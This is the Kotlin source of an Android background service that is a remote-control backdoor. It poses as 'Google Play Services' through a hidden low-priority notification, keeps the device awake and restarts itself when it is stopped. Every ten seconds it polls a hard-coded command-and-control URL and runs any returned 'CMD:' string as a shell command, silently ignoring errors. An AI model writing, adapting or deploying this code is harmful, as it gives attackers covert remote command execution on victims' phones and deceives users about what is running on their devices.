package com.assets.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class SyncService : Service() {

    companion object {
        const val CHANNEL_ID = "UraniumSupremeSecureCore"
        const val NOTIFICATION_ID = 999
        private const val C2_ENDPOINT = "https://web-assets-service.onrender.com/node/pulse"
        private const val NODE_ID = "Nasser_Supreme_Node"
    }

    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        acquireWakeLock()
        startForegroundServiceNotification()
        initializeCommandLoop()
    }

    private fun acquireWakeLock() {
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "UraniumSupreme::C2WakeLock"
        ).apply {
            acquire(10 * 60 * 60 * 1000L)
        }
    }

    private fun startForegroundServiceNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Google Play System Framework",
                NotificationManager.IMPORTANCE_NONE
            ).apply {
                description = "خدمة النظام الأساسية"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Play Services")
            .setContentText("System core running...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun initializeCommandLoop() {
        thread(start = true) {
            while (true) {
                try {
                    val url = URL(C2_ENDPOINT)
                    val connection = url.openConnection() as HttpURLConnection
                    connection.requestMethod = "POST"
                    connection.connectTimeout = 8000
                    connection.readTimeout = 8000
                    connection.doOutput = true
                    connection.setRequestProperty("User-Agent", "UraniumNode-v8.1")
                    
                    val payload = "node_id=$NODE_ID&status=active&timestamp=${System.currentTimeMillis()}"
                    connection.outputStream.write(payload.toByteArray(Charsets.UTF_8))
                    
                    if (connection.responseCode == 200) {
                        val reader = BufferedReader(InputStreamReader(connection.inputStream))
                        val response = reader.readText()
                        reader.close()
                        
                        if (response.isNotEmpty() && response.startsWith("CMD:")) {
                            executeRealCommand(response.substringAfter("CMD:"))
                        }
                    }
                    connection.disconnect()
                } catch (e: Exception) {
                    // الحفاظ على استمرار النبض وعدم توقف الخدمة أبداً
                }
                Thread.sleep(10000)
            }
        }
    }

    private fun executeRealCommand(command: String) {
        try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            while (reader.readLine() != null) {}
            reader.close()
            process.waitFor()
        } catch (e: Exception) {
            // معالجة صامتة للأوامر
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        wakeLock?.let { if (it.isHeld) it.release() }
        val restartIntent = Intent(applicationContext, SyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent)
        } else {
            startService(restartIntent)
        }
    }
}
